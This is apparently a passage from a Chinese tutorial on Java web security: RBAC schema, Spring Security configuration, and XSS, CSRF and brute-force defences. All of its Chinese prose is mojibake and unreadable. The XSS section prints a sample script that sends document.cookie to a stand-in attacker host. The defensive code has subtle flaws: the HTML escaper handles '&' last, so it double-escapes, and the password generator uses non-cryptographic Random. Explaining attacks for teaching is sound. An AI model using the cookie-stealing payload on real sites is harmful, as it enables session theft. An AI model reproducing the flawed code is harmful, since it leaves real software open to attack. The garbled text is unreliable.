**RBACå…¨ç§°**ï¼šRole-Based Access Controlï¼ˆåŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼‰

**ç”Ÿæ´»ä¸­çš„RBACä¾‹å­**ï¼š

```
åŒ»é™¢çš„æƒé™ç®¡ç†ï¼š
åŒ»ç”Ÿè§’è‰²ï¼šå¯ä»¥çœ‹ç—…ã€å¼€è¯ã€æŸ¥çœ‹ç—…å†
æŠ¤å£«è§’è‰²ï¼šå¯ä»¥æ‰§è¡ŒåŒ»å˜±ã€æµ‹é‡ä½“æ¸©ã€è®°å½•æ•°æ®
è¯å‰‚å¸ˆè§’è‰²ï¼šå¯ä»¥é…è¯ã€å‘è¯ã€è¯å“ç®¡ç†
ç—…äººè§’è‰²ï¼šåªèƒ½æŸ¥çœ‹è‡ªå·±çš„ç—…å†

å¼ åŒ»ç”Ÿ = åŒ»ç”Ÿè§’è‰² â†’ æ‹¥æœ‰åŒ»ç”Ÿçš„æ‰€æœ‰æƒé™
ææŠ¤å£« = æŠ¤å£«è§’è‰² â†’ æ‹¥æœ‰æŠ¤å£«çš„æ‰€æœ‰æƒé™
```

### 6.2 RBACæ¨¡å‹ç»“æ„


**äº”ä¸ªæ ¸å¿ƒæ¦‚å¿µ**ï¼š

```
ğŸ“Š RBACæƒé™æ¨¡å‹å›¾ï¼š

ç”¨æˆ·ï¼ˆUserï¼‰ â†â†’ ç”¨æˆ·è§’è‰²å…³ç³» â†â†’ è§’è‰²ï¼ˆRoleï¼‰ â†â†’ è§’è‰²æƒé™å…³ç³» â†â†’ æƒé™ï¼ˆPermissionï¼‰
    |                                                              |
å¼ ä¸‰ã€æå››ã€ç‹äº”                                        æŸ¥çœ‹ç”¨æˆ·ã€åˆ›å»ºè®¢å•ã€åˆ é™¤å•†å“
    |                             |                                |
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ç›´æ¥åˆ†é…æƒé™ â”€â”€â”€â”€â”€â”€â”˜                                â”‚
             ï¼ˆä¸æ¨èï¼Œå¤ªå¤æ‚ï¼‰                                      â”‚
                                                                   |
                        èµ„æºï¼ˆResourceï¼‰ â†â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                     ç”¨æˆ·ç®¡ç†é¡µé¢ã€è®¢å•åˆ—è¡¨ã€å•†å“è¯¦æƒ…
```

**æ•°æ®è¡¨è®¾è®¡**ï¼š
```sql
-- ç”¨æˆ·è¡¨
CREATE TABLE users (
    id BIGINT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(255),
    email VARCHAR(100)
);

-- è§’è‰²è¡¨  
CREATE TABLE roles (
    id BIGINT PRIMARY KEY,
    role_name VARCHAR(50),    -- è§’è‰²åï¼šç®¡ç†å‘˜ã€æ™®é€šç”¨æˆ·
    description VARCHAR(200)
);

-- æƒé™è¡¨
CREATE TABLE permissions (
    id BIGINT PRIMARY KEY,
    permission_name VARCHAR(50),  -- æƒé™åï¼šuser:viewã€order:create
    resource VARCHAR(100),        -- èµ„æºï¼š/admin/usersã€/api/orders
    action VARCHAR(50)            -- åŠ¨ä½œï¼šreadã€writeã€delete
);

-- ç”¨æˆ·è§’è‰²å…³è”è¡¨
CREATE TABLE user_roles (
    user_id BIGINT,
    role_id BIGINT,
    PRIMARY KEY (user_id, role_id)
);

-- è§’è‰²æƒé™å…³è”è¡¨  
CREATE TABLE role_permissions (
    role_id BIGINT,
    permission_id BIGINT,
    PRIMARY KEY (role_id, permission_id)
);
```

### 6.3 RBACå®é™…å®ç°


#### ğŸ”§ æƒé™æ£€æŸ¥æœåŠ¡


```java
@Service
public class PermissionService {
    
    // æ£€æŸ¥ç”¨æˆ·æ˜¯å¦æœ‰æŸä¸ªæƒé™
    public boolean hasPermission(String username, String permission) {
        // 1. æ ¹æ®ç”¨æˆ·åè·å–ç”¨æˆ·çš„æ‰€æœ‰è§’è‰²
        List<String> userRoles = getUserRoles(username);
        
        // 2. æ ¹æ®è§’è‰²è·å–æ‰€æœ‰æƒé™
        List<String> userPermissions = new ArrayList<>();
        for (String role : userRoles) {
            userPermissions.addAll(getRolePermissions(role));
        }
        
        // 3. åˆ¤æ–­æ˜¯å¦åŒ…å«æ‰€éœ€æƒé™
        return userPermissions.contains(permission);
    }
    
    // è·å–ç”¨æˆ·è§’è‰²
    private List<String> getUserRoles(String username) {
        return userRoleRepository.findRolesByUsername(username);
    }
    
    // è·å–è§’è‰²æƒé™
    private List<String> getRolePermissions(String roleName) {
        return rolePermissionRepository.findPermissionsByRole(roleName);
    }
}
```

#### ğŸ¯ æƒé™æ³¨è§£ä½¿ç”¨


```java
// åœ¨Controlleræ–¹æ³•ä¸Šä½¿ç”¨æƒé™æ³¨è§£
@RestController
public class UserController {
    
    // åªæœ‰æ‹¥æœ‰ user:view æƒé™çš„ç”¨æˆ·æ‰èƒ½è®¿é—®
    @PreAuthorize("hasPermission('user:view')")
    @GetMapping("/users")
    public List<User> getUsers() {
        return userService.findAll();
    }
    
    // åªæœ‰ç®¡ç†å‘˜è§’è‰²æ‰èƒ½åˆ›å»ºç”¨æˆ·
    @PreAuthorize("hasRole('ADMIN')")
    @PostMapping("/users")
    public User createUser(@RequestBody User user) {
        return userService.save(user);
    }
    
    // åªæœ‰ç”¨æˆ·æœ¬äººæˆ–ç®¡ç†å‘˜æ‰èƒ½æŸ¥çœ‹è¯¦æƒ…
    @PreAuthorize("hasRole('ADMIN') or #id == authentication.principal.id")
    @GetMapping("/users/{id}")
    public User getUser(@PathVariable Long id) {
        return userService.findById(id);
    }
}
```

---

## 7. ğŸ›¡ï¸ å®‰å…¨é˜²æŠ¤æœºåˆ¶


### 7.1 XSSæ”»å‡»é˜²æŠ¤


**XSSæ˜¯ä»€ä¹ˆ**ï¼šCross-Site Scriptingï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰

**æ”»å‡»åŸç†**ï¼š
```
æ¶æ„ç”¨æˆ·åœ¨ç½‘ç«™ä¸Šæäº¤åŒ…å«JavaScriptä»£ç çš„å†…å®¹
â†“
å¦‚æœç½‘ç«™æ²¡æœ‰è¿‡æ»¤ï¼Œç›´æ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸Š
â†“
å…¶ä»–ç”¨æˆ·è®¿é—®é¡µé¢æ—¶ï¼Œæ¶æ„ä»£ç è¢«æ‰§è¡Œ
â†“
å¯èƒ½çªƒå–ç”¨æˆ·cookieã€å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯
```

**å®é™…æ”»å‡»ä¾‹å­**ï¼š
```html
<!-- ç”¨æˆ·åœ¨è¯„è®ºæ¡†è¾“å…¥æ¶æ„ä»£ç  -->
<script>
    // çªƒå–ç”¨æˆ·cookieå‘é€åˆ°é»‘å®¢æœåŠ¡å™¨
    fetch('http://hacker.com/steal', {
        method: 'POST',
        body: document.cookie
    });
</script>

<!-- å¦‚æœç½‘ç«™ç›´æ¥æ˜¾ç¤ºï¼Œæ‰€æœ‰è®¿é—®çš„ç”¨æˆ·éƒ½ä¼šä¸­æ‹› -->
```

**é˜²æŠ¤æ–¹æ³•**ï¼š

```java
// 1. è¾“å…¥è¿‡æ»¤ - æ¸…ç†HTMLæ ‡ç­¾
@Component
public class XssFilter {
    
    public String cleanHtml(String input) {
        if (input == null) return null;
        
        // ä½¿ç”¨Jsoupæ¸…ç†HTMLæ ‡ç­¾
        return Jsoup.clean(input, Whitelist.basicWithImages());
    }
}

// 2. è¾“å‡ºè½¬ä¹‰ - åœ¨æ˜¾ç¤ºæ—¶è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦
public String escapeHtml(String input) {
    return input.replace("<", "&lt;")
               .replace(">", "&gt;")
               .replace("\"", "&quot;")
               .replace("'", "&#x27;")
               .replace("&", "&amp;");
}
```

### 7.2 CSRFæ”»å‡»é˜²æŠ¤


**CSRFæ˜¯ä»€ä¹ˆ**ï¼šCross-Site Request Forgeryï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰

**æ”»å‡»åœºæ™¯**ï¼š
```
1. ä½ ç™»å½•äº†é“¶è¡Œç½‘ç«™Aï¼Œæµè§ˆå™¨ä¿å­˜äº†ç™»å½•cookie
2. åŒæ—¶ä½ è®¿é—®äº†æ¶æ„ç½‘ç«™B
3. æ¶æ„ç½‘ç«™Bå·å·å‘é“¶è¡Œç½‘ç«™Aå‘èµ·è½¬è´¦è¯·æ±‚
4. ç”±äºæµè§ˆå™¨è‡ªåŠ¨æºå¸¦cookieï¼Œé“¶è¡Œä»¥ä¸ºæ˜¯ä½ æœ¬äººæ“ä½œ
5. ä½ çš„é’±è¢«è½¬èµ°äº†ï¼
```

**é˜²æŠ¤æ–¹æ³• - CSRF Token**ï¼š

```java
// Spring Securityè‡ªåŠ¨å¼€å¯CSRFé˜²æŠ¤
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // å¼€å¯CSRFé˜²æŠ¤ï¼ˆé»˜è®¤å¼€å¯ï¼‰
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            );
        return http.build();
    }
}
```

```html
<!-- å‰ç«¯è¡¨å•éœ€è¦åŒ…å«CSRF token -->
<form action="/transfer" method="post">
    <input type="hidden" name="_csrf" value="${_csrf.token}" />
    <input name="amount" placeholder="è½¬è´¦é‡‘é¢" />
    <button type="submit">è½¬è´¦</button>
</form>
```

### 7.3 å¯†ç å®‰å…¨ç­–ç•¥


#### ğŸ” å¯†ç å¤æ‚åº¦è¦æ±‚


```java
@Component
public class PasswordPolicy {
    
    public boolean isValidPassword(String password) {
        // å¯†ç é•¿åº¦è‡³å°‘8ä½
        if (password.length() < 8) {
            return false;
        }
        
        // å¿…é¡»åŒ…å«å¤§å†™å­—æ¯
        if (!password.matches(".*[A-Z].*")) {
            return false;
        }
        
        // å¿…é¡»åŒ…å«å°å†™å­—æ¯
        if (!password.matches(".*[a-z].*")) {
            return false;
        }
        
        // å¿…é¡»åŒ…å«æ•°å­—
        if (!password.matches(".*\\d.*")) {
            return false;
        }
        
        // å¿…é¡»åŒ…å«ç‰¹æ®Šå­—ç¬¦
        if (!password.matches(".*[!@#$%^&*()].*")) {
            return false;
        }
        
        return true;
    }
    
    public String generateStrongPassword() {
        // ç”ŸæˆåŒ…å«å„ç§å­—ç¬¦çš„å¼ºå¯†ç 
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
        StringBuilder password = new StringBuilder();
        Random random = new Random();
        
        for (int i = 0; i < 12; i++) {
            password.append(chars.charAt(random.nextInt(chars.length())));
        }
        
        return password.toString();
    }
}
```

#### ğŸš« æš´åŠ›ç ´è§£é˜²æŠ¤


```java
@Component
public class LoginAttemptService {
    
    private final Map<String, Integer> attemptsCache = new ConcurrentHashMap<>();
    
    // è®°å½•ç™»å½•å¤±è´¥
    public void loginFailed(String username) {
        attemptsCache.put(username, attemptsCache.getOrDefault(username, 0) + 1);
    }
    
    // ç™»å½•æˆåŠŸï¼Œæ¸…é™¤å¤±è´¥è®°å½•
    public void loginSucceeded(String username) {
        attemptsCache.remove(username);
    }
    
    // æ£€æŸ¥æ˜¯å¦è¢«é”å®š
    public boolean isBlocked(String username) {
        return attemptsCache.getOrDefault(username, 0) >= 5;  // 5æ¬¡å¤±è´¥å°±é”å®š
    }
    
    // è·å–å‰©ä½™å°è¯•æ¬¡æ•°
    public int getRemainingAttempts(String username) {
        return Math.max(0, 5 - attemptsCache.getOrDefault(username, 0));
    }
}
```

---

## 8. ğŸ¯ æ¡†æ¶é€‰å‹ä¸æœ€ä½³å®è·µ


### 8.1 æ¡†æ¶é€‰æ‹©å¯¹æ¯”


| ç‰¹æ€§å¯¹æ¯” | **Spring Security** | **Apache Shiro** | **è‡ªç ”æ–¹æ¡ˆ** |
|---------|-------------------|------------------|-------------|
| **å­¦ä¹ æˆæœ¬** | â­â­â­ è¾ƒé«˜ | â­â­ ä¸­ç­‰ | â­ ç®€å• |
| **åŠŸèƒ½å®Œæ•´åº¦** | â­â­â­ éå¸¸å®Œæ•´ | â­â­ åŸºæœ¬å®Œæ•´ | â­ åŸºç¡€åŠŸèƒ½ |
| **Springé›†æˆ** | â­â­â­ æ— ç¼é›†æˆ | â­â­ éœ€è¦é…ç½® | â­ éœ€è¦å¤§é‡å¼€å‘ |
| **ç¤¾åŒºæ”¯æŒ** | â­â­â­ æ´»è·ƒ | â­â­ ä¸€èˆ¬ | â­ æ— ç¤¾åŒºæ”¯æŒ |
| **ä¼ä¸šçº§ç‰¹æ€§** | â­â­â­ æ”¯æŒå®Œå–„ | â­â­ åŸºæœ¬æ”¯æŒ | â­ éœ€è¦è‡ªå·±å®ç° |

### 8.2 é€‰å‹å»ºè®®


**ğŸ¯ é¡¹ç›®é€‰å‹æŒ‡å—**ï¼š

```
é€‰æ‹©Spring Securityçš„åœºæ™¯ï¼š
âœ… é¡¹ç›®å·²ä½¿ç”¨Spring Boot/Spring Framework
âœ… éœ€è¦å¤æ‚çš„æƒé™æ§åˆ¶ï¼ˆå¦‚æ–¹æ³•çº§æƒé™ï¼‰
âœ… éœ€è¦OAuth2ã€SAMLç­‰ä¼ä¸šçº§è®¤è¯
âœ… å›¢é˜Ÿæœ‰ä¸€å®šæŠ€æœ¯ç»éªŒ
âœ… é¡¹ç›®è§„æ¨¡è¾ƒå¤§ï¼Œå®‰å…¨è¦æ±‚é«˜

é€‰æ‹©Apache Shiroçš„åœºæ™¯ï¼š
âœ… é¡¹ç›®ä¸ä½¿ç”¨Springæ¡†æ¶
âœ… éœ€è¦å¿«é€Ÿä¸Šæ‰‹ï¼Œå­¦ä¹ æˆæœ¬è¦ä½
âœ… æƒé™éœ€æ±‚ç›¸å¯¹ç®€å•
âœ… é¡¹ç›®è§„æ¨¡ä¸­å°å‹
âœ… å›¢é˜ŸæŠ€æœ¯æ°´å¹³ä¸€èˆ¬

é€‰æ‹©è‡ªç ”æ–¹æ¡ˆçš„åœºæ™¯ï¼š
âœ… é¡¹ç›®éå¸¸ç®€å•ï¼Œåªéœ€è¦åŸºæœ¬ç™»å½•
âœ… å¯¹æ€§èƒ½æœ‰æè‡´è¦æ±‚
âœ… æœ‰ç‰¹æ®Šçš„ä¸šåŠ¡éœ€æ±‚ç°æœ‰æ¡†æ¶æ— æ³•æ»¡è¶³
âŒ ä¸æ¨èï¼šå®‰å…¨å®¹æ˜“å‡ºé—®é¢˜ï¼Œç»´æŠ¤æˆæœ¬é«˜
```

### 8.3 æœ€ä½³å®è·µå»ºè®®


#### ğŸ”’ å®‰å…¨é…ç½®æœ€ä½³å®è·µ


```java
// 1. å®Œæ•´çš„å®‰å…¨é…ç½®ç¤ºä¾‹
@Configuration
@EnableWebSecurity
public class BestPracticeSecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // URLæƒé™é…ç½®
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/**", "/login", "/register").permitAll()
                .requestMatchers("/admin/**").hasRole("ADMIN")
                .requestMatchers("/api/user/**").hasAnyRole("USER", "ADMIN")
                .anyRequest().authenticated()
            )
            
            // ç™»å½•é…ç½®
            .formLogin(form -> form
                .loginPage("/login")
                .usernameParameter("email")     // è‡ªå®šä¹‰ç”¨æˆ·åå­—æ®µ
                .passwordParameter("pwd")       // è‡ªå®šä¹‰å¯†ç å­—æ®µ
                .defaultSuccessUrl("/dashboard")
                .failureUrl("/login?error=true")
            )
            
            // ç™»å‡ºé…ç½®
            .logout(logout -> logout
                .logoutUrl("/logout")
                .logoutSuccessUrl("/")
                .deleteCookies("JSESSIONID")    // æ¸…é™¤cookies
                .invalidateHttpSession(true)    // é”€æ¯session
            )
            
            // ä¼šè¯ç®¡ç†
            .sessionManagement(session -> session
                .maximumSessions(1)             // åŒä¸€ç”¨æˆ·æœ€å¤š1ä¸ªsession
                .maxSessionsPreventsLogin(false) // æ–°ç™»å½•è¸¢æ‰æ—§session
                .sessionRegistry(sessionRegistry())
            )
            
            // å®‰å…¨å¤´é…ç½®
            .headers(headers -> headers
                .frameOptions().deny()          // é˜²æ­¢ç‚¹å‡»åŠ«æŒ
                .contentTypeOptions().and()     // é˜²æ­¢MIMEç±»å‹å—…æ¢
                .httpStrictTransportSecurity(hstsConfig -> hstsConfig
                    .maxAgeInSeconds(31536000)  // HTTPSå¼ºåˆ¶1å¹´
                )
            );

        return http.build();
    }
}
```

#### ğŸ“Š æƒé™è®¾è®¡æœ€ä½³å®è·µ


```java
// 2. æƒé™å‘½åè§„èŒƒ
public class PermissionConstants {
    // èµ„æº:æ“ä½œ çš„å‘½åæ–¹å¼
    public static final String USER_VIEW = "user:view";
    public static final String USER_CREATE = "user:create";
    public static final String USER_UPDATE = "user:update";
    public static final String USER_DELETE = "user:delete";
    
    public static final String ORDER_VIEW = "order:view";
    public static final String ORDER_CREATE = "order:create";
    public static final String ORDER_CANCEL = "order:cancel";
    
    // è§’è‰²å®šä¹‰
    public static final String ROLE_ADMIN = "ROLE_ADMIN";
    public static final String ROLE_USER = "ROLE_USER";
    public static final String ROLE_VIP = "ROLE_VIP";
}

// 3. æƒé™æ£€æŸ¥å·¥å…·ç±»
@Component
public class SecurityUtils {
    
    // è·å–å½“å‰ç”¨æˆ·
    public static String getCurrentUsername() {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        return auth != null ? auth.getName() : null;
    }
    
    // æ£€æŸ¥å½“å‰ç”¨æˆ·æ˜¯å¦æœ‰æƒé™
    public static boolean hasPermission(String permission) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        if (auth == null) return false;
        
        return auth.getAuthorities().stream()
            .anyMatch(authority -> authority.getAuthority().equals(permission));
    }
    
    // æ£€æŸ¥æ˜¯å¦æ˜¯ç®¡ç†å‘˜
    public static boolean isAdmin() {
        return hasRole("ADMIN");
    }
    
    // æ£€æŸ¥è§’è‰²
    public static boolean hasRole(String role) {
        return hasPermission("ROLE_" + role);
    }
}
```

---

## 9. ğŸ“‹ æ ¸å¿ƒè¦ç‚¹æ€»ç»“


### 9.1 å¿…é¡»æŒæ¡çš„æ ¸å¿ƒæ¦‚å¿µ


```
ğŸ”¸ è®¤è¯ vs æˆæƒï¼šè®¤è¯è§£å†³"ä½ æ˜¯è°"ï¼Œæˆæƒè§£å†³"ä½ èƒ½åšä»€ä¹ˆ"
ğŸ”¸ Spring Securityï¼šåŠŸèƒ½å¼ºå¤§çš„ä¼ä¸šçº§å®‰å…¨æ¡†æ¶ï¼Œä¸Springæ— ç¼é›†æˆ
ğŸ”¸ Apache Shiroï¼šè½»é‡çº§å®‰å…¨æ¡†æ¶ï¼Œå­¦ä¹ æˆæœ¬ä½ï¼Œé€‚åˆä¸­å°å‹é¡¹ç›®
ğŸ”¸ JWTä»¤ç‰Œï¼šæ— çŠ¶æ€çš„è®¤è¯æ–¹å¼ï¼Œé€‚åˆå‰åç«¯åˆ†ç¦»å’Œç§»åŠ¨ç«¯
ğŸ”¸ OAuth2ï¼šç¬¬ä¸‰æ–¹æˆæƒåè®®ï¼Œå®ç°"å¾®ä¿¡ç™»å½•"ç­‰åŠŸèƒ½
ğŸ”¸ RBACæ¨¡å‹ï¼šåŸºäºè§’è‰²çš„æƒé™æ§åˆ¶ï¼Œç”¨æˆ·-è§’è‰²-æƒé™çš„ä¸‰çº§ç»“æ„
ğŸ”¸ å®‰å…¨é˜²æŠ¤ï¼šXSSã€CSRFã€å¯†ç ç­–ç•¥ã€æš´åŠ›ç ´è§£é˜²æŠ¤
```

### 9.2 å…³é”®ç†è§£è¦ç‚¹


**ğŸ”¹ ä¸ºä»€ä¹ˆéœ€è¦å®‰å…¨æ¡†æ¶**ï¼š
```
æ‰‹å·¥å®ç°çš„é—®é¢˜ï¼š
- å®‰å…¨æ¼æ´å¤šï¼šå®¹æ˜“é—æ¼å„ç§æ”»å‡»é˜²æŠ¤
- å¼€å‘æˆæœ¬é«˜ï¼šéœ€è¦å¤§é‡é‡å¤ç¼–ç 
- ç»´æŠ¤å›°éš¾ï¼šå®‰å…¨ç­–ç•¥å˜æ›´éœ€è¦å¤§é‡ä¿®æ”¹
- æ ‡å‡†ä¸ç»Ÿä¸€ï¼šä¸åŒå¼€å‘è€…å®ç°æ–¹å¼ä¸åŒ

æ¡†æ¶çš„ä¼˜åŠ¿ï¼š
- å®‰å…¨æ€§ç»è¿‡éªŒè¯ï¼šç»è¿‡å¤§é‡é¡¹ç›®è€ƒéªŒ
- åŠŸèƒ½å®Œæ•´ï¼šè¦†ç›–è®¤è¯ã€æˆæƒã€é˜²æŠ¤ç­‰å„ä¸ªæ–¹é¢  
- é…ç½®çµæ´»ï¼šå¯ä»¥æ ¹æ®é¡¹ç›®éœ€æ±‚å®šåˆ¶
- ç»´æŠ¤æˆæœ¬ä½ï¼šæ¡†æ¶è´Ÿè´£å®‰å…¨å®ç°ï¼Œæˆ‘ä»¬åªéœ€é…ç½®
```

**ğŸ”¹ é€‰æ‹©æ¡†æ¶çš„è€ƒè™‘å› ç´ **ï¼š
```
é¡¹ç›®å› ç´ ï¼š
- é¡¹ç›®è§„æ¨¡ï¼šå¤§é¡¹ç›®ç”¨Spring Securityï¼Œå°é¡¹ç›®å¯é€‰Shiro
- æŠ€æœ¯æ ˆï¼šSpringé¡¹ç›®ä¼˜é€‰Spring Security
- å®‰å…¨è¦æ±‚ï¼šé«˜å®‰å…¨è¦æ±‚å¿…é€‰æˆç†Ÿæ¡†æ¶
- å›¢é˜Ÿæ°´å¹³ï¼šæ–°æ‰‹å›¢é˜Ÿå¯è€ƒè™‘Shiro

ä¸šåŠ¡å› ç´ ï¼š
- æƒé™å¤æ‚åº¦ï¼šç®€å•æƒé™ç”¨åŸºç¡€åŠŸèƒ½ï¼Œå¤æ‚æƒé™éœ€è¦é«˜çº§ç‰¹æ€§
- é›†æˆéœ€æ±‚ï¼šéœ€è¦ç¬¬ä¸‰æ–¹ç™»å½•é€‰æ‹©æ”¯æŒOAuth2çš„æ¡†æ¶
- æ€§èƒ½è¦æ±‚ï¼šé«˜æ€§èƒ½åœºæ™¯è€ƒè™‘JWTæ— çŠ¶æ€æ–¹æ¡ˆ
- æ‰©å±•æ€§ï¼šè€ƒè™‘æœªæ¥ä¸šåŠ¡å‘å±•çš„æ‰©å±•éœ€æ±‚
```

### 9.3 å®é™…åº”ç”¨æŒ‡å¯¼


**ğŸ’¡ å¼€å‘å»ºè®®**ï¼š

> ğŸ“Œ **æ–°æ‰‹å­¦ä¹ è·¯å¾„**ï¼š
> 1. å…ˆç†è§£è®¤è¯æˆæƒåŸºæœ¬æ¦‚å¿µ
> 2. ä»ç®€å•çš„ç”¨æˆ·åå¯†ç ç™»å½•å¼€å§‹
> 3. é€æ­¥æ·»åŠ æƒé™æ§åˆ¶
> 4. å­¦ä¹ é«˜çº§ç‰¹æ€§å¦‚OAuth2ã€JWT
> 5. äº†è§£å„ç§å®‰å…¨é˜²æŠ¤æœºåˆ¶

> âš ï¸ **å¸¸è§é”™è¯¯é¿å…**ï¼š
> - ä¸è¦åœ¨ä»£ç ä¸­ç¡¬ç¼–ç å¯†ç å’Œå¯†é’¥
> - ä¸è¦å¿½ç•¥HTTPSçš„é‡è¦æ€§  
> - ä¸è¦è¿‡åº¦å¤æ‚åŒ–æƒé™è®¾è®¡
> - ä¸è¦å¿˜è®°å¯¹æ•æ„Ÿæ“ä½œè¿›è¡Œæ—¥å¿—è®°å½•

**ğŸ¯ é¡¹ç›®å®æ–½æ­¥éª¤**ï¼š

```
ç¬¬ä¸€é˜¶æ®µï¼šåŸºç¡€è®¤è¯
1ï¸âƒ£ æ­å»ºç™»å½•æ³¨å†ŒåŠŸèƒ½
2ï¸âƒ£ å®ç°å¯†ç åŠ å¯†å­˜å‚¨  
3ï¸âƒ£ é…ç½®åŸºæœ¬çš„URLæƒé™æ§åˆ¶

ç¬¬äºŒé˜¶æ®µï¼šæƒé™ç®¡ç†
4ï¸âƒ£ è®¾è®¡RBACæƒé™æ¨¡å‹
5ï¸âƒ£ å®ç°è§’è‰²å’Œæƒé™ç®¡ç†
6ï¸âƒ£ æ·»åŠ æ–¹æ³•çº§æƒé™æ§åˆ¶

ç¬¬ä¸‰é˜¶æ®µï¼šé«˜çº§ç‰¹æ€§
7ï¸âƒ£ é›†æˆJWTæˆ–OAuth2
8ï¸âƒ£ æ·»åŠ ç¬¬ä¸‰æ–¹ç™»å½•
9ï¸âƒ£ å®Œå–„å®‰å…¨é˜²æŠ¤æœºåˆ¶

ç¬¬å››é˜¶æ®µï¼šä¼˜åŒ–å®Œå–„
ğŸ”Ÿ æ€§èƒ½ä¼˜åŒ–å’Œç›‘æ§
â­ å®‰å…¨å®¡è®¡å’Œæ—¥å¿—
â­ ç”¨æˆ·ä½“éªŒä¼˜åŒ–
```

### 9.4 è®°å¿†è¦ç‚¹


**æ ¸å¿ƒè®°å¿†å£è¯€**ï¼š
- å®‰å…¨æ¡†æ¶ä¿å¹³å®‰ï¼Œè®¤è¯æˆæƒè¦åˆ†æ¸…
- Spring SecurityåŠŸèƒ½å…¨ï¼ŒShiroè½»é‡å­¦å¾—å¿«  
- JWTä»¤ç‰Œæ— çŠ¶æ€ï¼ŒOAuthç¬¬ä¸‰æ–¹ç™»å½•
- RBACè§’è‰²ç®¡æƒé™ï¼Œç”¨æˆ·è§’è‰²æƒé™é“¾
- XSSè¿‡æ»¤CSRFé˜²ï¼Œå¯†ç åŠ å¯†é˜²æš´åŠ›

**ğŸ”‘ å…³é”®æŠ€èƒ½æ¸…å•**ï¼š
- [ ] ç†è§£è®¤è¯ä¸æˆæƒçš„åŒºåˆ«
- [ ] èƒ½å¤Ÿé…ç½®Spring SecurityåŸºæœ¬åŠŸèƒ½
- [ ] æŒæ¡JWTä»¤ç‰Œçš„ç”Ÿæˆå’ŒéªŒè¯
- [ ] äº†è§£OAuth2çš„æˆæƒæµç¨‹
- [ ] èƒ½å¤Ÿè®¾è®¡RBACæƒé™æ¨¡å‹
- [ ] çŸ¥é“å¸¸è§å®‰å…¨æ”»å‡»çš„é˜²æŠ¤æ–¹æ³•
- [ ] èƒ½å¤Ÿæ ¹æ®é¡¹ç›®éœ€æ±‚é€‰æ‹©åˆé€‚çš„å®‰å…¨æ¡†æ¶